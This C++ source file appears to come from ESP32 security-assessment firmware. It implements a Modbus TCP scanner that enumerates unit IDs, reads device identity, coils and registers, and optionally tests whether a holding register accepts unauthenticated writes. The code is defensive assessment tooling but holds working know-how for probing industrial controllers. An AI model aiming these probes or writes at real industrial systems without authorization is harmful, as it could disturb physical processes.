#include "modbus_tcp_plugin.h"
#include "../core/configuration_manager.h"
#include "../core/reporting_engine.h"
#include "../core/logging_system.h"
#include "../core/plugin_manager.h"
#include "../assessment/fuzzing_engine.h"
#include "../network/assessment_interface.h"

#include "../core/psram_allocator.h"
#include "../core/psram_json_parser.h"

namespace {
    struct JsonHookGuard {
        JsonHookGuard() { PSRAMJson::ensureHooks(); }
    };
    static JsonHookGuard kJsonHookGuard;
}

extern "C" {
    #include "lwip/sockets.h"
    #include "lwip/inet.h"
    #include "esp_timer.h"
    #include "esp_random.h"
    #include "esp_task_wdt.h"
    #include <errno.h>
    #include "esp_netif.h"
    #include "freertos/FreeRTOS.h"
    #include "freertos/task.h"
}
#include "cJSON.h"
#ifdef SO_BINDTODEVICE
#include <net/if.h>
#endif
#include <fcntl.h>
#include "../assessment/discovery_manager.h"
#include <sstream>
#include <map>
#include <cstdlib>
#include "../core/event_formatter.h"
#include <cstring>
#include <ctime>
#include <iomanip>
#include <algorithm>
#include <iomanip>
#include <core/logging_system.h>

// Helper function to convert bytes to hex string
static std::string bytesToHex(const std::vector<uint8_t>& data) {
    // Use PSRAM buffer instead of std::stringstream to avoid IRAM allocation
    if (data.empty()) return std::string();

    size_t hex_size = data.size() * 3;  // Each byte = 2 hex chars + 1 space
    char* hex_buf = (char*)heap_caps_malloc(hex_size + 1, MALLOC_CAP_SPIRAM);
    if (!hex_buf) return std::string("[hex_alloc_failed]");

    char* p = hex_buf;
    for (size_t i = 0; i < data.size(); ++i) {
        if (i > 0) *p++ = ' ';
        p += snprintf(p, 3, "%02X", (unsigned)data[i]);
    }
    *p = '\0';

    std::string result(hex_buf);
    heap_caps_free(hex_buf);
    return result;
}
// Configure the TCP socket to close aggressively and free the PCBs immediately
static void configureTcpSocket(int sock) {
    if (sock < 0) {
        return;
    }
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
#endif
#ifdef SO_LINGER
    struct linger ling;
    memset(&ling, 0, sizeof(ling));
    ling.l_onoff = 1;
    ling.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
#endif
}

// Scoped handler to temporarily extend the watchdog during long scans
class ScopedDiscoveryWdtExtension {
public:
    ScopedDiscoveryWdtExtension(ConfigurationManager* cfg, uint32_t min_timeout_ms)
    : cfg_(cfg) {
        if (!cfg_) {
            return;
        }
        WatchdogConfig wd = cfg_->getWatchdogConfig();
        if (!wd.enabled) {
            return;
        }
        saved_config_.timeout_ms = wd.timeout_seconds * 1000U;
        saved_config_.idle_core_mask = wd.monitor_idle_cores ? ((1U << 0) | (1U << 1)) : 0U;
        saved_config_.trigger_panic = wd.panic_on_timeout;
        uint32_t desired = saved_config_.timeout_ms;
        if (desired < min_timeout_ms) {
            desired = min_timeout_ms;
        }
        if (desired == saved_config_.timeout_ms) {
            return;
        }
        esp_task_wdt_config_t tmp = saved_config_;
        tmp.timeout_ms = desired;
        if (esp_task_wdt_reconfigure(&tmp) == ESP_OK) {
            valid_ = true;
            LOG_INFOF("ModbusTCP", "Task WDT extended to %ums for discovery", (unsigned)desired);
        } else {
            LOG_WARNING("ModbusTCP", "Unable to extend the Task WDT for discovery");
        }
    }

    ~ScopedDiscoveryWdtExtension() {
        if (!valid_) {
            return;
        }
        if (esp_task_wdt_reconfigure(&saved_config_) == ESP_OK) {
            LOG_INFOF("ModbusTCP", "Task WDT restored to %ums", (unsigned)saved_config_.timeout_ms);
        } else {
            LOG_WARNING("ModbusTCP", "Task WDT restore failed after discovery");
        }
    }
private:
    ConfigurationManager* cfg_ = nullptr;
    esp_task_wdt_config_t saved_config_{};
    bool valid_ = false;
};

static const char* TAG_MB = "ModbusTCP";

static inline uint16_t rd16be_local(const uint8_t* p) {
    return (uint16_t)(((uint16_t)p[0] << 8) | (uint16_t)p[1]);
}

static bool modbusLooksLikeAdu(const uint8_t* data, size_t len) {
    if (!data || len < 8) return false;
    // MBAP Protocol ID must be 0x0000
    if (data[2] != 0x00 || data[3] != 0x00) return false;
    // MBAP length (UnitID + PDU) must be at least 2 bytes.
    uint16_t mbap_len = rd16be_local(data + 4);
    if (mbap_len < 2) return false;
    return true;
}

static bool locateModbusAdu(const NetworkPacket& pkt, const uint8_t*& out, size_t& out_len) {
    out = nullptr;
    out_len = 0;
    if (!pkt.data || pkt.length < 8) return false;

    // Case 1: data already points to MBAP (raw TCP payload path).
    if (modbusLooksLikeAdu(pkt.data, pkt.length)) {
        out = pkt.data;
        out_len = pkt.length;
        return true;
    }

    // Case 2: data points to IPv4 packet (L2 ingest path).
    const uint8_t* ip = pkt.data;
    size_t ip_len = pkt.length;
    if ((ip[0] >> 4) != 4 || ip_len < 20) return false;

    size_t ihl = (size_t)(ip[0] & 0x0F) * 4U;
    if (ihl < 20 || ihl > ip_len) return false;

    uint8_t ip_proto = ip[9];
    if (ip_proto == 6) { // TCP
        if (ip_len < ihl + 20) return false;
        const uint8_t* tcp = ip + ihl;
        size_t doff = (size_t)((tcp[12] >> 4) & 0x0F) * 4U;
        if (doff < 20 || ip_len < ihl + doff) return false;
        const uint8_t* mbap = tcp + doff;
        size_t mbap_len = ip_len - (ihl + doff);
        if (!modbusLooksLikeAdu(mbap, mbap_len)) return false;
        out = mbap;
        out_len = mbap_len;
        return true;
    }

    if (ip_proto == 17) { // UDP (non standard for Modbus TCP, but tolerated for robustness)
        if (ip_len < ihl + 8) return false;
        const uint8_t* udp = ip + ihl;
        const uint8_t* mbap = udp + 8;
        size_t mbap_len = ip_len - (ihl + 8);
        if (!modbusLooksLikeAdu(mbap, mbap_len)) return false;
        out = mbap;
        out_len = mbap_len;
        return true;
    }

    return false;
}

ModbusTCPPlugin::ModbusTCPPlugin()
: BasePlugin("ModbusTCP","0.3.0", ProtocolType::MODBUS_TCP) {}

bool ModbusTCPPlugin::isPacketWriter(const NetworkPacket& pkt) const {
    const uint8_t* adu = nullptr;
    size_t adu_len = 0;
    if (!locateModbusAdu(pkt, adu, adu_len) || adu_len < 8) return false;
    uint8_t function_code = adu[7];
    return isWriteFunction(function_code);
}

bool ModbusTCPPlugin::initialize(ConfigurationManager* config, ReportingEngine* rep) {
    BasePlugin::initialize(config, rep);
    // Pull plugin-specific config
    if (config) {
        auto m = config->getProtocolConfig(ProtocolType::MODBUS_TCP);
        std::map<std::string, std::string> params;
        for (const auto& kv : m) {
            params.emplace(PSRAMUtils::fromPSRAMString(kv.first), PSRAMUtils::fromPSRAMString(kv.second));
        }
        auto getInt = [&](const char* key, int fallback) -> int {
            auto it = params.find(key);
            if (it == params.end() || it->second.empty()) return fallback;
            return atoi(it->second.c_str());
        };
        auto getBool = [&](const char* key, bool fallback) -> bool {
            auto it = params.find(key);
            if (it == params.end()) return fallback;
            std::string v = it->second;
            std::transform(v.begin(), v.end(), v.begin(), [](unsigned char c){ return (unsigned char)std::tolower(c); });
            if (v == "true" || v == "1" || v == "yes" || v == "on") return true;
            if (v == "false" || v == "0" || v == "no" || v == "off") return false;
            return fallback;
        };

        cfg_.default_unit_id = getInt("default_unit_id", getInt("unit_id", cfg_.default_unit_id));
        cfg_.connect_timeout_ms = getInt("connect_timeout_ms", cfg_.connect_timeout_ms);
        cfg_.io_timeout_ms = getInt("io_timeout_ms", cfg_.io_timeout_ms);
        cfg_.discovery_connect_timeout_ms = getInt("discovery_connect_timeout_ms", cfg_.discovery_connect_timeout_ms);
        cfg_.discovery_io_timeout_ms = getInt("discovery_io_timeout_ms", cfg_.discovery_io_timeout_ms);
        cfg_.discovery_request_retries = getInt("discovery_request_retries", cfg_.discovery_request_retries);
        cfg_.discovery_connect_retries = getInt("discovery_connect_retries", cfg_.discovery_connect_retries);
        cfg_.discovery_prescan_timeout_ms = getInt("discovery_prescan_timeout_ms", cfg_.discovery_prescan_timeout_ms);
        cfg_.discovery_probe_coils_max = getInt("discovery_probe_coils_max", cfg_.discovery_probe_coils_max);
        cfg_.enable_test_write = getBool("enable_test_write", cfg_.enable_test_write);
        cfg_.discovery_prescan_enabled = getBool("discovery_prescan_enabled", cfg_.discovery_prescan_enabled);
        cfg_.test_write_register = getInt("test_write_register", cfg_.test_write_register);

        cfg_.allowed_writers.clear();
        if (auto it = params.find("allowed_writers"); it != params.end()) {
            std::stringstream ss(it->second);
            std::string item;
            while (std::getline(ss, item, ',')) {
                item.erase(std::remove_if(item.begin(), item.end(), [](unsigned char c){ return c == ' ' || c == '\"'; }), item.end());
                if (!item.empty()) cfg_.allowed_writers.push_back(item);
            }
        }

        cfg_.discovery_unit_ids.clear();
        if (auto it = params.find("discovery_unit_ids"); it != params.end()) {
            std::stringstream ss(it->second);
            std::string token;
            while (std::getline(ss, token, ',')) {
                token.erase(std::remove_if(token.begin(), token.end(), [](unsigned char c){ return c == ' ' || c == '\"'; }), token.end());
                if (token.empty()) continue;
                long val = strtol(token.c_str(), nullptr, 0);
                if (val >= 0 && val <= 255) cfg_.discovery_unit_ids.push_back((uint8_t)val);
            }
        }
        if (cfg_.discovery_unit_ids.empty()) {
            cfg_.discovery_unit_ids = {1,2,3,4,5,6,7,8,9,10,16,17,32,64,255};
        }

        if (cfg_.discovery_connect_timeout_ms < cfg_.connect_timeout_ms) cfg_.discovery_connect_timeout_ms = cfg_.connect_timeout_ms;
        if (cfg_.discovery_io_timeout_ms < cfg_.discovery_connect_timeout_ms) cfg_.discovery_io_timeout_ms = cfg_.discovery_connect_timeout_ms;
        if (cfg_.discovery_request_retries < 1) cfg_.discovery_request_retries = 1;
        if (cfg_.discovery_connect_retries < 1) cfg_.discovery_connect_retries = 1;
        if (cfg_.discovery_prescan_timeout_ms <= 0) cfg_.discovery_prescan_timeout_ms = 250;
        if (cfg_.discovery_probe_coils_max <= 0) cfg_.discovery_probe_coils_max = 16;
        if (cfg_.discovery_probe_coils_max > 247) cfg_.discovery_probe_coils_max = 247;

        if (auto it = params.find("alert_broadcast_write"); it != params.end()) {
            alert_broadcast_write_ = getBool("alert_broadcast_write", alert_broadcast_write_);
        }
    }

    // Register Modbus-specific event extractor with centralized SessionStateMachine
    getSessionStateMachine().registerProtocolCallbacks(
        SessionEventHelpers::extractModbusEvent,
        nullptr  // Use default transition validator
    );

    LOG_INFO(TAG_MB, "ModbusTCPPlugin initialized");
    return true;
}

void ModbusTCPPlugin::shutdown() {
    LOG_INFO(TAG_MB, "ModbusTCPPlugin shutdown");
}

bool ModbusTCPPlugin::parseTarget(const std::string& target, std::string& host, uint16_t& port, int& unit_id) {
    host.clear(); port = 502; unit_id = -1;
    // Expected formats:
    // ip
    // ip:port
    // ip:port?uid=1
    // ip?uid=1
    auto qpos = target.find('?');
    std::string base = (qpos==std::string::npos)?target:target.substr(0,qpos);
    std::string q = (qpos==std::string::npos)?"":target.substr(qpos+1);
    auto cpos = base.find(':');
    if (cpos==std::string::npos) host = base;
    else { host = base.substr(0,cpos); port = (uint16_t)atoi(base.substr(cpos+1).c_str()); }
    if (!q.empty()) {
        auto upos = q.find("uid=");
        if (upos!=std::string::npos) {
            unit_id = atoi(q.substr(upos+4).c_str());
        }
    }
    return !host.empty();
}

bool ModbusTCPPlugin::modbusConnect(const std::string& host, uint16_t port, int& sock) {
    sock = AssessmentInterface::openBoundSocket(AF_INET, SOCK_STREAM, 0);
    if (sock<0) return false;
    configureTcpSocket(sock);
    // Bind socket to Ethernet interface (ETH_DEF) to force egress on ETH
    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    esp_netif_ip_info_t eth_ip{};
    if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
        ::close(sock); sock = -1; return false; // Ethernet not ready
    }
#ifdef SO_BINDTODEVICE
    {
        struct ifreq ifr;
        if_indextoname(esp_netif_get_netif_impl_index(eth), ifr.ifr_name);
        (void)setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(struct ifreq));
    }
#endif
    struct timeval tv;
    tv.tv_sec = cfg_.connect_timeout_ms/1000;
    tv.tv_usec = (cfg_.connect_timeout_ms%1000)*1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host.c_str());
    int r = ::connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    if (r!=0) { ::close(sock); sock=-1; return false; }
    return true;
}

bool ModbusTCPPlugin::modbusSendRecv(int sock, const std::vector<uint8_t>& pdu, std::vector<uint8_t>& out, int unit_id, uint16_t& txid) {
    psram_vector<uint8_t> tmp;
    bool ok = modbusSendRecv(sock, pdu, tmp, unit_id, txid);
    if (ok) {
        out.assign(tmp.begin(), tmp.end());
    } else {
        out.clear();
    }
    return ok;
}

bool ModbusTCPPlugin::modbusSendRecv(int sock, const std::vector<uint8_t>& pdu, psram_vector<uint8_t>& out, int unit_id, uint16_t& txid) {
    // Build MBAP header (7 bytes): TxID, ProtocolID=0, Length=unit_id+PDU, UnitID
    uint16_t len = (uint16_t)(pdu.size()+1);
    uint8_t mbap[7];
    mbap[0] = (uint8_t)((txid>>8)&0xFF);
    mbap[1] = (uint8_t)(txid&0xFF);
    mbap[2] = 0; mbap[3] = 0; // protocol id
    mbap[4] = (uint8_t)((len>>8)&0xFF);
    mbap[5] = (uint8_t)(len&0xFF);
    mbap[6] = (uint8_t)((unit_id>=0)?unit_id:cfg_.default_unit_id);
    psram_vector<uint8_t> buf;
    buf.reserve(7+pdu.size());
    buf.insert(buf.end(), mbap, mbap+7);
    buf.insert(buf.end(), pdu.begin(), pdu.end());

    ssize_t wr = ::send(sock, (const char*)buf.data(), buf.size(), 0);
    if (wr!=(ssize_t)buf.size()) return false;

    uint8_t rmbap[7];
    ssize_t rd = ::recv(sock, (char*)rmbap, 7, 0);
    if (rd!=7) return false;
    uint16_t rlen = ((uint16_t)rmbap[4]<<8) | rmbap[5];
    if (rlen==0 || rlen>260) return false;
    out.assign(rlen-1, 0);
    rd = ::recv(sock, (char*)out.data(), out.size(), 0);
    if (rd!=(ssize_t)out.size()) return false;
    txid++;
    return true;
}

std::vector<uint8_t> ModbusTCPPlugin::pduReadCoils(uint16_t addr, uint16_t qty) {
    return {0x01, (uint8_t)(addr>>8), (uint8_t)addr, (uint8_t)(qty>>8), (uint8_t)qty};
}
std::vector<uint8_t> ModbusTCPPlugin::pduReadDiscrete(uint16_t addr, uint16_t qty) {
    return {0x02, (uint8_t)(addr>>8), (uint8_t)addr, (uint8_t)(qty>>8), (uint8_t)qty};
}
std::vector<uint8_t> ModbusTCPPlugin::pduReadHolding(uint16_t addr, uint16_t qty) {
    return {0x03, (uint8_t)(addr>>8), (uint8_t)addr, (uint8_t)(qty>>8), (uint8_t)qty};
}
std::vector<uint8_t> ModbusTCPPlugin::pduReadInput(uint16_t addr, uint16_t qty) {
    return {0x04, (uint8_t)(addr>>8), (uint8_t)addr, (uint8_t)(qty>>8), (uint8_t)qty};
}
std::vector<uint8_t> ModbusTCPPlugin::pduReportSlaveID() {
    return {0x11};
}
std::vector<uint8_t> ModbusTCPPlugin::pduDeviceIdentificationBasic() {
    // FC=0x2B MEI=0x0E Read Device ID (basic 0x01, object id 0x00)
    return {0x2B, 0x0E, 0x01, 0x00};
}
std::vector<uint8_t> ModbusTCPPlugin::pduWriteSingleRegister(uint16_t addr, uint16_t value) {
    return {0x06, (uint8_t)(addr>>8), (uint8_t)addr, (uint8_t)(value>>8), (uint8_t)value};
}

template <typename Vec>
static inline bool modbusIsExceptionImpl(const Vec& pdu) {
    if (pdu.empty()) return true;
    uint8_t fc = pdu[0];
    return (fc & 0x80u) != 0;
}

template <typename Vec>
static inline uint8_t modbusGetFunctionCodeImpl(const Vec& pdu) {
    if (pdu.empty()) return 0;
    return pdu[0];
}

bool ModbusTCPPlugin::isException(const std::vector<uint8_t>& pdu) {
    return modbusIsExceptionImpl(pdu);
}

bool ModbusTCPPlugin::isException(const psram_vector<uint8_t>& pdu) {
    return modbusIsExceptionImpl(pdu);
}

uint8_t ModbusTCPPlugin::getFunctionCode(const std::vector<uint8_t>& pdu) {
    return modbusGetFunctionCodeImpl(pdu);
}

uint8_t ModbusTCPPlugin::getFunctionCode(const psram_vector<uint8_t>& pdu) {
    return modbusGetFunctionCodeImpl(pdu);
}

std::string ModbusTCPPlugin::doVulnerabilityScan(const std::string& target) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target.c_str());
    psram_string report_ps;
    if (!doVulnerabilityScanPSRAM(target_ps, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool ModbusTCPPlugin::doVulnerabilityScanPSRAM(const psram_string& target,
                                               psram_string& out_report) {
    std::string legacy_target = PSRAMUtils::fromPSRAMString(target);
    std::string legacy_report = legacyDoVulnerabilityScan(legacy_target);
    if (legacy_report.empty()) {
        out_report.clear();
        return false;
    }
    out_report = PSRAMUtils::createPSRAMString(legacy_report.c_str());
    return true;
}

std::string ModbusTCPPlugin::legacyDoVulnerabilityScan(const std::string& target) {
    std::stringstream report;
    report << "=== Modbus TCP Vulnerability Scan Report ===\n";
    report << "Target: " << target << "\n\n";

    psram_string target_ps = PSRAMUtils::createPSRAMString(target.c_str());
    std::string host; uint16_t port=502; int unit_id=-1;
    if (!parseTarget(target, host, port, unit_id)) {
        LOG_WARNING(TAG_MB, "Invalid target");
        return "";  // Empty string = scan failed due to invalid target
    }

    int sock=-1;
    if (!modbusConnect(host, port, sock)) {
        // Return empty string to indicate scan failure (not successful)
        // The vulnerability is still reported via reportVulnerability() for logging
        reportVulnerabilityPSRAM(
            target_ps,
            PSRAMUtils::createPSRAMString("{\"issue\":\"unreachable\",\"detail\":\"TCP connect failed\"}"),
            psram_string{},
            LogLevel::WARNING);
        scans_fail_++;
        return "";  // Empty string = scan failed due to connection error
    }

    report << "? CONNECTION: Successfully connected to " << host << ":" << port << "\n\n";

    bool ok_all = true;
    uint16_t txid = 1;

    auto sendpdu = [&](const std::vector<uint8_t>& req, const char* name, const char* description) -> bool {
        PSRAMJsonParser::PSRAMContext json_ctx;
        psram_vector<uint8_t> resp;
        bool ok = modbusSendRecv(sock, req, resp, unit_id, txid);
        if (!ok) {
            report << "? " << description << ": No response\n";
            cJSON* v = cJSON_CreateObject();
            cJSON_AddStringToObject(v, "issue", "no_response");
            cJSON_AddStringToObject(v, "op", name);
            char* vjson = cJSON_PrintUnformatted(v);
            if (vjson) {
                psram_string payload = PSRAMUtils::createPSRAMString(vjson);
                reportVulnerabilityPSRAM(target_ps, payload, psram_string{}, LogLevel::WARNING);
                free(vjson);
            }
            cJSON_Delete(v);
            ok_all = false;
            return false;
        }
        if (isException(resp)) {
            uint8_t exc_code = (resp.size() > 1) ? resp[1] : 0;
            report << "??  " << description << ": Exception " << (int)exc_code << "\n";
            cJSON* v = cJSON_CreateObject();
            cJSON_AddStringToObject(v, "issue", "exception");
            cJSON_AddStringToObject(v, "op", name);
            cJSON_AddNumberToObject(v, "code", (int)exc_code);
            char* vjson = cJSON_PrintUnformatted(v);
            if (vjson) {
                psram_string payload = PSRAMUtils::createPSRAMString(vjson);
                reportVulnerabilityPSRAM(target_ps, payload, psram_string{}, LogLevel::INFO);
                free(vjson);
            }
            cJSON_Delete(v);
            return false;
        }
        report << "? " << description << ": Success (FC=" << (int)getFunctionCode(resp) << ", " << resp.size() << " bytes)\n";
        return true;
    };

    // 1) Device Identification
    report << "--- Device Identification ---\n";
    sendpdu(pduReportSlaveID(), "report_slave_id", "Report Slave ID");
    sendpdu(pduDeviceIdentificationBasic(), "device_identification", "Device Identification");

    // 2) Read Operations Test
    report << "\n--- Read Operations ---\n";
    sendpdu(pduReadCoils(0, 16), "read_coils", "Read Coils (0-15)");
    sendpdu(pduReadDiscrete(0, 16), "read_discrete_inputs", "Read Discrete Inputs (0-15)");
    sendpdu(pduReadHolding(0, 4), "read_holding_0_4", "Read Holding Registers (0-3)");
    sendpdu(pduReadInput(0, 4), "read_input_0_4", "Read Input Registers (0-3)");

    // 3) Write Permission Test
    if (cfg_.enable_test_write) {
        report << "\n--- Write Permission Test ---\n";
        uint16_t reg = (uint16_t)cfg_.test_write_register;

        // Read current value first
        psram_vector<uint8_t> rresp;
        bool rok = modbusSendRecv(sock, pduReadHolding(reg, 1), rresp, unit_id, txid);
        if (rok && !isException(rresp) && rresp.size()>=3) {
            uint8_t nbytes = rresp[1];
            uint16_t value = 0;
            if (nbytes>=2) value = ((uint16_t)rresp[2]<<8) | (nbytes>=3?(uint8_t)rresp[3]:0);

            // Write same value back
            psram_vector<uint8_t> wresp;
            bool wok = modbusSendRecv(sock, pduWriteSingleRegister(reg, value), wresp, unit_id, txid);
            if (wok && !isException(wresp)) {
                report << "??  Write Single Register " << reg << ": WRITE ALLOWED (value=" << value << ")\n";
                cJSON* v = cJSON_CreateObject();
                cJSON_AddStringToObject(v, "issue", "write_allowed");
                cJSON_AddNumberToObject(v, "register", reg);
                cJSON_AddStringToObject(v, "note", "write single register succeeded");
                char* vjson = cJSON_PrintUnformatted(v);
                if (vjson) {
                    psram_string payload = PSRAMUtils::createPSRAMString(vjson);
                    reportVulnerabilityPSRAM(target_ps, payload, psram_string{}, LogLevel::WARNING);
                    free(vjson);
                }
                cJSON_Delete(v);
            } else {
                report << "? Write Single Register " << reg << ": Write protected\n";
            }
        } else {
            report << "? Write test skipped: Cannot read register " << reg << "\n";
            reportVulnerabilityPSRAM(
                target_ps,
                PSRAMUtils::createPSRAMString("{\"issue\":\"write_test_skipped\",\"reason\":\"read failed\"}"),
                psram_string{},
                LogLevel::INFO);
        }
    } else {
        report << "\n--- Write Permission Test ---\n";
        report << "??  Write testing disabled in configuration\n";
    }

    ::close(sock);

    report << "\n=== Scan Summary ===\n";
    if (ok_all) {
        report << "? Scan completed successfully\n";
        scans_ok_++;
    } else {
        report << "??  Scan completed with issues\n";
        scans_fail_++;
    }

    return report.str();
}

// Helpers per MBAP e Device ID
static std::vector<uint8_t> makeMBAP(uint16_t tid, uint8_t unit, uint16_t pdu_len) {
    std::vector<uint8_t> mbap(7);
    mbap[0] = (uint8_t)((tid >> 8) & 0xFF);
    mbap[1] = (uint8_t)(tid & 0xFF);
    mbap[2] = 0x00; mbap[3] = 0x00; // Protocol ID = 0
    uint16_t len = (uint16_t)(pdu_len + 1); // UnitID + PDU
    mbap[4] = (uint8_t)((len >> 8) & 0xFF);
    mbap[5] = (uint8_t)(len & 0xFF);
    mbap[6] = unit; // Unit ID
    return mbap;
}

static std::vector<uint8_t> makeReadDeviceIdReq(uint16_t tid, uint8_t unit,
                                                uint8_t dev_id_code, uint8_t start_object_id) {
    // PDU: [0x2B, 0x0E, dev_id_code(0x01=Basic/0x02=Regular/0x03=Extended/0x04=Individual), start_object_id]
    std::vector<uint8_t> pdu = {0x2B, 0x0E, dev_id_code, start_object_id};
    auto mbap = makeMBAP(tid, unit, (uint16_t)pdu.size());
    mbap.insert(mbap.end(), pdu.begin(), pdu.end());
    return mbap;
}

// Helper: build Read Coils request (FC=0x01)
static std::vector<uint8_t> makeReadCoilsReq(uint16_t tid, uint8_t unit,
                                            uint16_t start_address,
                                            uint16_t quantity) {
    std::vector<uint8_t> pdu = {
        0x01,  // Function code: Read Coils
        (uint8_t)((start_address >> 8) & 0xFF), (uint8_t)(start_address & 0xFF),
        (uint8_t)((quantity >> 8) & 0xFF),      (uint8_t)(quantity & 0xFF)
    };
    auto mbap = makeMBAP(tid, unit, (uint16_t)pdu.size());
    mbap.insert(mbap.end(), pdu.begin(), pdu.end());
    return mbap;
}

// Helper: build Read Holding Registers request (FC=0x03)
static std::vector<uint8_t> makeReadHoldingRegistersReq(uint16_t tid, uint8_t unit,
                                                       uint16_t start_address,
                                                       uint16_t quantity) {
    std::vector<uint8_t> pdu = {
        0x03,  // Function code: Read Holding Registers
        (uint8_t)((start_address >> 8) & 0xFF), (uint8_t)(start_address & 0xFF),
        (uint8_t)((quantity >> 8) & 0xFF),      (uint8_t)(quantity & 0xFF)
    };
    auto mbap = makeMBAP(tid, unit, (uint16_t)pdu.size());
    mbap.insert(mbap.end(), pdu.begin(), pdu.end());
    return mbap;
}

static bool recvFully(int sock, psram_vector<uint8_t>& out, int timeout_ms) {
    out.clear();
    if (sock < 0) {
        return false;
    }

    const int effective_timeout_ms = (timeout_ms > 0) ? timeout_ms : 1000;
    uint64_t deadline_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) + (uint64_t)effective_timeout_ms;

    uint64_t host_loop_start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    uint8_t mbap[7];
    size_t received = 0;
    while (received < sizeof(mbap)) {
        // Check timeout within host MEI loop to avoid infinite loops
        uint64_t host_loop_elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - host_loop_start_ms;
        if (host_loop_elapsed_ms > 250) { // 250 milliseconds timeout for MEI loop
            LOG_WARNINGF(TAG_MB, "? recvFully loop timeout after %llu ms",
                        host_loop_elapsed_ms);
            return false;
        }
        ssize_t r = recv(sock, (char*)mbap + received, sizeof(mbap) - received, 0);
        if (r <= 0) {
            if (r < 0 && (errno == EINTR)) {
                continue;
            }
            if (r < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                if ((uint64_t)(esp_timer_get_time() / 1000ULL) < deadline_ms) {
                    continue;
                }
            }
            return false;
        }
        received += (size_t)r;
        if ((uint64_t)(esp_timer_get_time() / 1000ULL) > deadline_ms) {
            return false;
        }
    }

    uint16_t pdu_len = ((uint16_t)mbap[4] << 8) | mbap[5];
    if (pdu_len == 0 || pdu_len > 1024) {
        return false;
    }

    out.resize(sizeof(mbap) + pdu_len);
    std::memcpy(out.data(), mbap, sizeof(mbap));

    deadline_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) + (uint64_t)effective_timeout_ms;
    size_t offset = 0;
    while (offset < pdu_len) {
        ssize_t r = recv(sock, (char*)out.data() + sizeof(mbap) + offset, pdu_len - offset, 0);
        if (r <= 0) {
            if (r < 0 && errno == EINTR) {
                continue;
            }
            if (r < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                if ((uint64_t)(esp_timer_get_time() / 1000ULL) < deadline_ms) {
                    continue;
                }
            }
            return false;
        }
        offset += (size_t)r;
        if ((uint64_t)(esp_timer_get_time() / 1000ULL) > deadline_ms) {
            return false;
        }
    }

    return true;
}
void ModbusTCPPlugin::buildUnitScanList(psram_vector<uint8_t>& out) const {
    out.clear();
    if (!cfg_.discovery_unit_ids.empty()) {
        for (uint8_t id : cfg_.discovery_unit_ids) {
            if (std::find(out.begin(), out.end(), id) == out.end()) {
                out.push_back(id);
            }
        }
    }

    if (cfg_.default_unit_id > 0 && cfg_.default_unit_id <= 255) {
        uint8_t def = static_cast<uint8_t>(cfg_.default_unit_id);
        if (std::find(out.begin(), out.end(), def) == out.end()) {
            out.push_back(def);
        }
    }

    if (out.empty()) {
        static const uint8_t fallback[] = {1,2,3,4,5,6,7,8,9,10,16,17,32,64,255};
        out.assign(fallback, fallback + sizeof(fallback));
    } else {
        std::sort(out.begin(), out.end());
        out.erase(std::unique(out.begin(), out.end()), out.end());
    }
}

static bool sendRequestWithRetry(int sock, const std::vector<uint8_t>& request, psram_vector<uint8_t>& response, int timeout_ms, int retries) {
    uint64_t host_loop_start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    for (int attempt = 0; attempt < retries; ++attempt) {
        // Check timeout within host MEI loop to avoid infinite loops
        uint64_t host_loop_elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - host_loop_start_ms;
        if (host_loop_elapsed_ms > 5000) { // 5 seconds timeout for MEI loop
            LOG_WARNINGF(TAG_MB, "? sendRequestWithRetry loop timeout after %llu ms",
                        host_loop_elapsed_ms);
            return false;
        }

        ssize_t sent = send(sock, (const char*)request.data(), (int)request.size(), 0);
        if (sent != (ssize_t)request.size()) {
            if (attempt + 1 < retries) {
                vTaskDelay(pdMS_TO_TICKS(50));
                continue;
            }
            return false;
        }

        if (recvFully(sock, response, timeout_ms)) {
            return true;
        }

        if (attempt + 1 < retries) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
    return false;
}



struct DeviceIdKV { uint8_t id; psram_string value; };
static bool parseDeviceIdResponse(const psram_vector<uint8_t>& resp,
                                  uint8_t& conformity, uint8_t& more_follows,
                                  uint8_t& next_object_id, psram_vector<DeviceIdKV>& kvs) {
    // MBAP (7) + Unit(1) + PDU(..). Expected PDU: 0x2B 0x0E dev_id_code conformity more next count objs...
    if (resp.size() < 14) return false;
    size_t pdu = 7; // starts from Function
    if (resp[pdu] != 0x2B || resp[pdu+1] != 0x0E) return false;
    conformity    = resp[pdu+3];
    more_follows  = resp[pdu+4];
    next_object_id= resp[pdu+5];
    uint8_t obj_count = resp[pdu+6];
    size_t idx = pdu + 7;
    kvs.clear();
    for (uint8_t i = 0; i < obj_count; ++i) {
        if (idx + 2 > resp.size()) return false;
        uint8_t obj_id = resp[idx++];
        uint8_t obj_len= resp[idx++];
        if (idx + obj_len > resp.size()) return false;
        psram_string v((const char*)&resp[idx], (const char*)&resp[idx] + obj_len);
        idx += obj_len;
        kvs.push_back({obj_id, v});
    }
    return true;
}

// Mappa object-id comuni a nomi leggibili
static const char* devIdName(uint8_t id) {
    switch(id){
        case 0x00: return "VendorName";
        case 0x01: return "ProductCode";
        case 0x02: return "Revision";
        case 0x03: return "VendorURL";
        case 0x04: return "ProductName";
